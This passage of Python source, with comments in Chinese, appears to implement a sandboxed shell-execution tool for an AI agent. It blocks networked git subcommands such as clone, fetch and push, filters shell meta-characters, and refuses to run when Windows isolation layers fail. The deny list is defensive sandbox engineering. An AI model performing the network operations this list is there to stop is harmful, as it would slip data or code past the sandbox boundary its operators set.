        if kind == "inline":
            code = operand
        elif kind == "script":
            if not operand:
                return {"error": "command blocked: python missing script operand"}
            code, read_reason = await _read_workspace_script(operand)
            if code is None:
                return {"error": f"command blocked: {read_reason}"}
        if code:
            block_reason = check_static(code)
            if block_reason:
                return {"error": f"command blocked: python code rejected — {block_reason}"}

    # 对 git 命令额外限制：禁止 clone/fetch/pull/push 等网络操作，仅允许本地操作
    git_restricted = {"clone", "fetch", "pull", "push", "remote", "submodule", "archive", "ls-remote"}
    if _normalize_exe(prog) == "git" and rest:
        subcmd = rest[0] if rest and not rest[0].startswith("-") else ""
        if subcmd in git_restricted:
            return {"error": f"git command blocked: '{subcmd}' is not allowed in sandbox"}

    # Windows: echo/dir/type 等是 cmd.exe 内置命令，无独立可执行文件，
    # create_subprocess_exec 直执会 WinError 2；用 cmd /c 包裹执行。
    # 安全措施：在包裹前检测 args 中是否包含 shell 元字符（见模块级 _SHELL_META）。
    exe_name = _normalize_exe(prog)
    if sys.platform == "win32" and exe_name not in ("python", "python3"):
        for part in args:
            if _SHELL_META.search(part):
                return {"error": f"command blocked: shell meta-character in argument: {part!r}"}
        prog, rest = os.environ.get("COMSPEC", "cmd.exe"), ["/d", "/s", "/c", *args]

    # S5-2：统一资源限制（POSIX 由 fork 后的子进程施加；Windows 无 resource，靠超时兜底）
    #
    # `restricted` 档走**完全不同的创建路径**：受限令牌 + 独立桌面 + 自建可继承管道
    # （`win_launch.launch_restricted`）。它挡得住写，但也因此不能用
    # `create_subprocess_exec` —— asyncio 的管道不可继承，句柄传不进子进程。
    # 该路径是同步阻塞的（ReadFile + WaitForSingleObject），必须丢进线程，
    # 否则一次 `npm run build` 会卡死整个事件循环。
    try:
        from app.isolation import Level, resolve_level

        _decision = resolve_level()
    except Exception as exc:  # noqa: BLE001 — 探测失败按"无隔离"降级，由下面既有路径兜底
        logger.warning("shell_exec: resolve_level failed: %s", exc)
        _decision = None

    if _decision is not None and _decision.effective in (
        Level.RESTRICTED,
        Level.APPCONTAINER,
    ):
        from app.isolation import win_launch

        # 这两档都必须**自建进程**，因为 `create_subprocess_exec` 表达不了它们的
        # 建进程参数：`restricted` 要另一个令牌（`CreateProcessAsUserW`），
        # `appcontainer` 要进程属性列表（`STARTUPINFOEXW` + `CreateProcessW`）。
        # 建法不同，但"起不来就拒绝执行"的语义完全一致。
        launcher = (
            win_launch.launch_appcontainer
            if _decision.effective is Level.APPCONTAINER
            else win_launch.launch_restricted
        )
        result = await asyncio.to_thread(
            launcher,
            [prog, *rest],
            cwd=str(workspace_dir()),
            env=sandboxed_env(),
            timeout=float(timeout),
        )
        if not result.started:
            # 起不来就**拒绝执行**，不退回无隔离路径 ——
            # 悄悄降级正是"看起来有隔离"的老问题。
            return {
                "error": (
                    f"sandbox unavailable: {_decision.effective.value} exec failed — "
                    f"{result.spawn_error}"
                ),
            }
        stdout_text, stdout_truncated, stdout_log = offload_execute_output(
            result.stdout, "stdout"
        )
        stderr_text, stderr_truncated, stderr_log = offload_execute_output(
            result.stderr, "stderr"
        )
        payload: dict[str, Any] = {
            "exit_code": result.exit_code,
            "stdout": stdout_text,
            "stderr": stderr_text,
            "truncated": stdout_truncated or stderr_truncated,
        }
        _attach_log_paths(payload, stdout_log, stderr_log)
        return payload

    # **按档位改变执行路径**：`low_il` 及以上必须由**子进程自己**降级 —— 完整性级别
    # 改的是当前进程令牌，且 Windows 没有撤销 API，父进程一旦调用会连引擎一起降级。
    #
    # 原来这里直接把 `prog` 交给 `create_subprocess_exec`，于是 `job` / `low_il` /
    # `appcontainer` 三档走的是**同一行代码**（`wrap_async_process` 只判
    # `rank < Level.JOB`），用户切档位、状态接口也如实报告新档位，实际执行强度却
    # 一点没变。`child_launch_argv` 把档位变成 argv 的差异，让"切换档位"真正
    # 等于"改变执行路径"。
    exec_argv = [prog, *rest]
    if _decision is not None:
        try:
            from app.isolation import child_launch_argv

            exec_argv = child_launch_argv(_decision, exec_argv)
        except Exception as exc:  # noqa: BLE001
            # fail-closed：需要隔离却装不上隔离层时拒绝执行，不退回无隔离路径。
            # 悄悄降级正是"看起来有隔离"的老问题（与上面 restricted 分支同一口径）。
            return {"error": f"sandbox unavailable: isolation launcher failed — {exc}"}

    proc = await asyncio.create_subprocess_exec(
        *exec_argv,
        cwd=str(workspace_dir()),
        env=sandboxed_env(),
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        **_rlimit_kwargs(),
    )
    # Windows：挂进 Job Object。这是 `low_il` 以下（含）唯一覆盖**整棵进程树**的
    # 机制 —— 墙钟 timeout 只能 kill 直接子进程，`cmd /c build.bat` 的孙进程会成孤儿。
    # job 必须持有到进程结束：句柄一关 KILL_ON_JOB_CLOSE 立刻生效（见 wrap_async_process）。
    job = None
    try:
        from app.isolation import COMMAND_LIMITS, resolve_level, wrap_async_process

        job = wrap_async_process(proc, resolve_level(), COMMAND_LIMITS)
    except Exception as exc:  # noqa: BLE001 — 隔离附加失败不应让命令跑不起来
        logger.warning("shell_exec: job object attach failed: %s", exc)
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except TimeoutError:
        proc.kill()
        await proc.wait()
        return {"error": "timeout", "timeout": timeout}
    finally:
        # 必须显式关闭：job 句柄泄漏会累积内核对象，且 KILL_ON_JOB_CLOSE 永远不触发
        if job is not None:
            job.close()
    # 批 B 片 5：执行输出按字节上限截断，并**显式标注**截断量（exit_code 不受影响 ——
    # 不能因为输出太大就丢掉"命令到底成功没有"这个最关键的信息）。
    # E1：超限不再"砍掉中段就完事"——完整输出落盘并给出可续取路径。
    stdout_text, stdout_truncated, stdout_log = offload_execute_output(
        stdout.decode("utf-8", errors="replace"), "stdout"
    )
    stderr_text, stderr_truncated, stderr_log = offload_execute_output(
        stderr.decode("utf-8", errors="replace"), "stderr"
    )
    payload: dict[str, Any] = {
        "exit_code": proc.returncode,
        "stdout": stdout_text,
        "stderr": stderr_text,
        "truncated": stdout_truncated or stderr_truncated,
    }
    _attach_log_paths(payload, stdout_log, stderr_log)
    return payload
